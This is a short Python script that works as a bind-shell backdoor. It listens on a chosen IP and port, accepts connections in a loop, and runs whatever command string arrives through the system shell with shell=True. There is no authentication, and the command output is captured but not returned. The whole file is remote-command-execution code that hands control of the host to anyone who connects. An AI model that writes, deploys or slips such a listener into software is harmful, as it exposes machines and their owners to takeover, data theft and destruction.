import socket
import subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = input("ip - ")
port = input("port - ")
porta = int(port)

s.bind((ip, porta))
while True:
	print("[+]waiting for connection")
	s.listen(1)
	connection, address=s.accept()
	print(f"[+]received connection from {address[0]}:{address[1]}")

	command = connection.recv(1024).decode("utf-8").strip()

	terminal = subprocess.run(command, shell=True, capture_output=True, text=True)
	connection.close()
s.close()

